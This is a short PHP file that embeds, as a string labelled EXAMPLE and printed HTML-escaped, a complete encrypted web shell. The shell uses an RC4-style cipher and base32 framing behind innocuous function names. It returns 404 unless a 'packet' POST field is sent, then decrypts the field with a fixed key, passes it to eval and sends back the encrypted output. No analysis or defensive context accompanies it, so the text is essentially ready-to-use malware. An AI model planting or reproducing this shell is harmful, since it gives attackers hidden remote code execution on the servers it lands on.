<?php
$documentation = <<<'EXAMPLE'
<?php
function transform($key, $data) {
    $s = range(0, 255);
    $j = 0;
    for ($i = 0; $i < 256; $i++) {
        $j = ($j + $s[$i] + ord($key[$i % strlen($key)])) % 256;
        $t = $s[$i]; $s[$i] = $s[$j]; $s[$j] = $t;
    }
    $i = $j = 0;
    $out = '';
    for ($n = 0; $n < strlen($data); $n++) {
        $i = ($i + 1) % 256;
        $j = ($j + $s[$i]) % 256;
        $t = $s[$i]; $s[$i] = $s[$j]; $s[$j] = $t;
        $out .= chr(ord($data[$n]) ^ $s[($s[$i] + $s[$j]) % 256]);
    }
    return $out;
}
function unframe($text) {
    $alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567';
    $bits = 0; $count = 0; $out = '';
    foreach (str_split(rtrim($text, '=')) as $char) {
        $value = strpos($alphabet, $char);
        if ($value === false) { continue; }
        $bits = ($bits << 5) | $value; $count += 5;
        if ($count >= 8) { $count -= 8; $out .= chr(($bits >> $count) & 255); }
        $bits &= (1 << $count) - 1;
    }
    return $out;
}
function frame($text) {
    $alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567';
    $bits = 0; $count = 0; $out = '';
    foreach (str_split($text) as $char) {
        $bits = ($bits << 8) | ord($char); $count += 8;
        while ($count >= 5) { $count -= 5; $out .= $alphabet[($bits >> $count) & 31]; }
        $bits &= (1 << $count) - 1;
    }
    if ($count) { $out .= $alphabet[($bits << (5 - $count)) & 31]; }
    return $out;
}
if (!isset($_POST['packet'])) {
    http_response_code(404);
    exit;
}
$key = pack('H*', '0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef');
$result = @eval(transform($key, unframe($_POST['packet'])));
if ($result !== null) { echo frame(transform($key, (string)$result)); }
EXAMPLE;
echo htmlspecialchars($documentation);
